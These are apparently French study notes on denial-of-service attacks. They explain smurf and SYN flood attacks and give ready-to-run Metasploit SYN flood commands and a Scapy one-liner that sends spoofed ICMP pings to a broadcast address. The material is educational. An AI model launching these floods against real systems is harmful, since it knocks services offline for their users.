## Déni de service

Concept : Consiste à remplir une zone de stockage ou un canal de communication jusqu'à ce que l'on ne puisse plus l'utiliser.

### DoS par smurf

* La machine attaquante envoie un ping à des serveurs de broadcast
* Le serveur répercute la requête sur l'ensemble du réseau
* Toutes les machines répondent au serveur de broadcast
* Les serveurs redirigent les réponses vers la cible.

### DoS par SYN flood

* S'applique dans le cadre du protocole TCP
* consiste à envoyer une succession de requête SYN vers la cible


### Exemples


**Metasploit**

```
use auxiliary/dos/tcp/synflood
show options
set RHOST=[IP_cible]
exploit
```

**Scapy**

```Python
i = IP()
i.dst = "192.168.133.255"

ping = ICMP()
requete = (i/ping)
send(requete) # lancer wireshark

# en 1 ligne
send(IP(dst="192.168.133.255", src="192.168.133.129")/ICMP(), count=1000, verbose=1)
```
